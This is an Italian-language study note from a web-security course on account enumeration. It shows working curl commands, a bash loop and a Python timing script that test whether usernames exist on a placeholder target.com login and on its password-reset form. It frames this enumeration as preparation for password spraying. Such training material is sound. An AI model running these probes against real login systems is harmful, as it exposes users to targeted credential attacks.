# Account Enumeration

**Difficolta:** Intermediate
**Time to Master:** 1.5h
**Prerequisiti:** [02-Race-Conditions.md](02-Race-Conditions.md)
**Lab:** PortSwigger Academy — Username enumeration

---

## Obiettivo

Determinare se username/email esistono nel sistema sfruttando differenze di risposta (messaggio, status code, tempo) tra tentativo su account esistente e non esistente — base per attacchi mirati di credential stuffing/spraying.

---

## Concetti chiave

### Dove cercano enumeration

| Funzionalita | Differenziale tipico |
|---------------|------------------------|
| Login | "Invalid username" vs "Invalid password" |
| Password reset | "Email inviata" solo se l'account esiste |
| Registrazione | "Username gia in uso" |
| Login (timing) | tempo di risposta diverso se l'account esiste (hash verificato vs no) |

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| Burp Intruder | lista username, confronta risposte | messaggio/size/tempo diverso | principale |
| ffuf | `-fr "regex_messaggio_non_esiste"` | filtra risposte per pattern | rapido per liste grandi |

---

## Payload / Esempi

### Esempio 1: enumeration via messaggio di errore differente

```bash
curl -s -d "username=admin&password=x" http://target.com/login
# -> "Invalid password"

curl -s -d "username=nonexistentuser999&password=x" http://target.com/login
# -> "Invalid username"
```

**Spiegazione:** due messaggi distinti rivelano immediatamente se un username esiste, senza bisogno di indovinare la password — usa questa differenza per validare un'intera wordlist di username candidati prima di un attacco di password spraying (vedi [06-Authentication-Authorization/05-Credential-Attacks.md](../06-Authentication-Authorization/05-Credential-Attacks.md)).

### Esempio 2: enumeration via status code/redirect diverso

```bash
for u in admin test123 nonexistent; do
  echo -n "$u: "
  curl -s -o /dev/null -w "%{http_code}\n" -d "username=$u&password=x" http://target.com/login
done
```

### Esempio 3: enumeration via timing attack (quando i messaggi sono identici)

```python
import requests, time

def check(username):
    start = time.time()
    requests.post("http://target.com/login", data={"username": username, "password": "wrongpass"})
    return time.time() - start

# Un account esistente spesso impiega piu tempo (verifica hash password reale)
# Un account inesistente spesso risponde piu velocemente (short-circuit prima dell'hash check)
print("admin:", check("admin"))
print("nonexistent999:", check("nonexistent999"))
```

**Spiegazione:** anche quando messaggio e status code sono identici (buona pratica di sicurezza), la differenza di tempo tra "verifica hash bcrypt di una password reale" e "rifiuta subito, utente non trovato" puo restare misurabile e sfruttabile.

### Esempio 4: enumeration via funzione "password dimenticata"

```bash
curl -s -d "email=admin@target.com" http://target.com/forgot-password
# -> "Se l'account esiste, riceverai una email"  (buona pratica) 
# vs
# -> "Email inviata a admin@target.com" (rivela esistenza) 
# vs redirect/status diverso tra i due casi
```

---

## Evasion / Bypass Techniques

Non applicabile in senso WAF; la tecnica e interamente nell'analisi statistica delle differenze di risposta — ripeti ogni test piu volte per escludere rumore di rete prima di concludere che esista un differenziale timing.

---

## Lab Hands-On

### Lab 1: PortSwigger — Username enumeration via subtly different responses
**Obiettivo:** distinguere username validi da invalidi tramite differenza sottile nella risposta
**Difficulty:** Medio
**Time:** 30 min

**Walkthrough breve:**
1. Confronta byte-per-byte le risposte per username noto vs sconosciuto
2. Trova il differenziale (anche un singolo carattere di differenza conta)
3. Automatizza con Burp Intruder su una wordlist di username

---

## Common Mistakes

- Fermarsi al confronto del solo messaggio visibile -> controlla anche header, status code, lunghezza esatta della risposta (spesso il differenziale e minuscolo)
- Non ripetere i timing test piu volte -> la rete introduce rumore, serve una media su piu campioni per essere affidabili

---

## Link Utili

- [PortSwigger — Username enumeration](https://portswigger.net/web-security/authentication/other-mechanisms)

---

## Connessioni

- **Prerequisito:** [02-Race-Conditions.md](02-Race-Conditions.md)
- **Prossimo Step:** [04-Timing-Attacks.md](04-Timing-Attacks.md)
- **Combinazione con:** [06-Authentication-Authorization/05-Credential-Attacks.md](../06-Authentication-Authorization/05-Credential-Attacks.md)

---

## Checklist di padronanza

- [ ] So trovare differenziali di messaggio/status/lunghezza risposta
- [ ] So eseguire un timing attack base con script Python
- [ ] So automatizzare l'enumeration su una wordlist con Burp Intruder

---

## Note personali

_(spazio libero)_
